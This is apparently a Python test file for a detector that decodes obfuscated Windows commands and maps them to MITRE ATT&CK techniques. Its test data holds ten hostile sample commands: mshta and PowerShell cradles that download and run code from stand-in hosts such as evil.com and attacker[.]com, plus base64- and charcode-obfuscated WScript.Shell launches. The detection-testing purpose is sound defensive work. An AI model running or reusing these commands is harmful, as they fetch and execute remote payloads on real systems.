"""
Test realistic commands from sample_commands.md - Mixed-signal "analyst headache" section.
This tests the full detection pipeline with real-world attack patterns.
"""

import sys
import os

# Add src directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from core.detector import detect_t1059, detect_t1218, detect_t1027, detect_t1105, detect_t1071
from core.decoder import decode_command

# Realistic commands from sample_commands.md
REALISTIC_COMMANDS = [
    {
        "name": "Multi-technique chain (PS->mshta->JS->ActiveX->network)",
        "cmd": 'powershell.exe -c mshta.exe "javascript:try{var a=new ActiveXObject(\'MSXML2.XMLHTTP\');a.open(\'GET\',\'https://cdn-example[.]com/r\',0);a.send();if(a.status==200){Function(a.responseText)();}}catch(e){}"',
        "expected": ["T1059", "T1218", "T1105", "T1071"]
    },
    {
        "name": "Direct WScript.Shell.Run to cmd.exe",
        "cmd": "mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c whoami',0)",
        "expected": ["T1059", "T1218"]
    },
    {
        "name": "Light obfuscation - String concatenation",
        "cmd": "mshta.exe \"javascript:var p='cmd''.exe';var w=new ActiveXObject('WScript.Shell');w.Run(p+' /c calc',0)\"",
        "expected": ["T1059", "T1218"]
    },
    {
        "name": "Heavy obfuscation - Base64 encoded PowerShell",
        "cmd": "powershell.exe -encodedCommand JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAHMALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAiACwAIgBjADoAXAB0AGUAbQBwAFwAcAAuAGUAeABlACIAKQA=",
        "expected": ["T1059", "T1105", "T1071"]
    },
    {
        "name": "Heavy obfuscation - JavaScript fromCharCode",
        "cmd": 'mshta.exe "javascript:eval(String.fromCharCode(118,97,114,32,115,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,83,104,101,108,108,39,41,59,115,46,82,117,110,40,39,99,109,100,46,101,120,101,32,47,99,32,119,104,111,97,109,105,39,44,48,41))"',
        "expected": ["T1059", "T1218"]
    },
    {
        "name": "Heavy obfuscation - JavaScript atob() base64",
        "cmd": "mshta.exe \"javascript:eval(atob('dmFyIHM9bmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuU2hlbGwnKTtzLlJ1bignY21kLmV4ZSAvYyB3aG9hbWknLDApOw=='))\"",
        "expected": ["T1059", "T1218"]
    },
    {
        "name": "Extreme obfuscation - Multi-layer PS+base64+fromCharCode",
        "cmd": 'powershell.exe -nop -w hidden -c "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(\'https://evil.com/stage1\'))))"',
        "expected": ["T1059", "T1105", "T1071"]
    },
    {
        "name": "VBScript via mshta with Execute and command chaining",
        "cmd": "mshta.exe \"vbscript:Execute(CreateObject('WScript.Shell').Run('cmd.exe /c powershell -nop -c Get-ProcessList',0))\"",
        "expected": ["T1059", "T1218"]
    },
    {
        "name": "Remote code download + local execution",
        "cmd": "mshta.exe \"javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET','https://attacker[.]com/stager.ps1',0);xhr.send();new Function(xhr.responseText)()\"",
        "expected": ["T1059", "T1218", "T1105", "T1071"]
    },
    {
        "name": "Multi-layer staging: PS->mshta->vbscript->cmd",
        "cmd": 'powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'https://stager.com/p1.ps1\'); Start-Process mshta.exe -ArgumentList \'vbscript:Set o=CreateObject(\\"WScript.Shell\\"):o.Run(\\"cmd.exe /c powershell -ep bypass -c iex(gci env:PSCommandPath).Value\\",0)\'"',
        "expected": ["T1059", "T1218", "T1105", "T1071"]
    }
]


def test_realistic_commands():
    """Test all realistic commands and report detection results."""
    print("=" * 80)
    print("REALISTIC COMMAND DETECTION TEST")
    print("=" * 80)
    print()
    
    total_commands = len(REALISTIC_COMMANDS)
    detection_summary = {
        "T1059": {"detected": 0, "expected": 0},
        "T1218": {"detected": 0, "expected": 0},
        "T1027": {"detected": 0, "expected": 0},
        "T1105": {"detected": 0, "expected": 0},
        "T1071": {"detected": 0, "expected": 0}
    }
    
    for i, test_case in enumerate(REALISTIC_COMMANDS, 1):
        print(f"\n[{i}/{total_commands}] {test_case['name']}")
        print("-" * 80)
        
        cmd = test_case['cmd']
        expected_techniques = test_case['expected']
        
        # First try to decode
        decode_result = decode_command(cmd)
        if decode_result['was_decoded']:
            print(f"[+] Decoder was able to decode obfuscation")
            print(f"  Encodings detected: {', '.join(decode_result['encodings_detected'])}")
            print(f"  Encodings decoded: {', '.join(decode_result['encodings_decoded'])}")
            print(f"  Original length: {len(cmd)} chars")
            print(f"  Decoded length:  {len(decode_result['decoded'])} chars")
            cmd_to_analyze = decode_result['decoded']
        else:
            print(f"[ ] No decoding needed or decoder couldn't decode")
            cmd_to_analyze = cmd
        
        # Run detections
        detections_t1059 = detect_t1059(cmd_to_analyze)
        detections_t1218 = detect_t1218(cmd_to_analyze)
        detections_t1027 = detect_t1027(cmd_to_analyze)
        detections_t1105 = detect_t1105(cmd_to_analyze)
        detections_t1071 = detect_t1071(cmd_to_analyze)
        
        all_detections = detections_t1059 + detections_t1218 + detections_t1027 + detections_t1105 + detections_t1071
        detected_techniques = list(set([d['technique_id'] for d in all_detections]))
        
        # Update summary
        for tech in expected_techniques:
            detection_summary[tech]["expected"] += 1
            if tech in detected_techniques:
                detection_summary[tech]["detected"] += 1
        
        if detections_t1027:
            detection_summary["T1027"]["detected"] += 1
        
        # Display results
        print(f"\nExpected: {', '.join(expected_techniques)}")
        print(f"Detected: {', '.join(detected_techniques) if detected_techniques else 'None'}")
        
        if all_detections:
            print(f"\nDetection Details ({len(all_detections)} total):")
            for detection in all_detections:
                subtechnique = f".{detection.get('sub_technique_id', '')}" if detection.get('sub_technique_id') else ""
                full_id = f"{detection['technique_id']}{subtechnique}"
                confidence = detection['confidence']
                print(f"  • {full_id}: {detection['technique']} (confidence: {confidence:.2f})")
                if detection['evidence']:
                    print(f"    Evidence: {', '.join(detection['evidence'][:3])}")
        else:
            print("\n[!] No detections!")
        
        # Check if we met expectations
        missing = set(expected_techniques) - set(detected_techniques)
        extra = set(detected_techniques) - set(expected_techniques) - {"T1027"}  # T1027 is bonus
        
        if missing:
            print(f"\n[!] MISSED: {', '.join(missing)}")
        if not missing and not extra:
            print(f"\n[+] All expected techniques detected!")
    
    # Print summary
    print("\n" + "=" * 80)
    print("DETECTION SUMMARY")
    print("=" * 80)
    
    for tech, stats in detection_summary.items():
        if stats["expected"] > 0:
            rate = (stats["detected"] / stats["expected"]) * 100
            print(f"{tech}: {stats['detected']}/{stats['expected']} detected ({rate:.0f}%)")
        elif stats["detected"] > 0:
            print(f"{tech}: {stats['detected']} detected (not expected, but good!)")
    
    print()
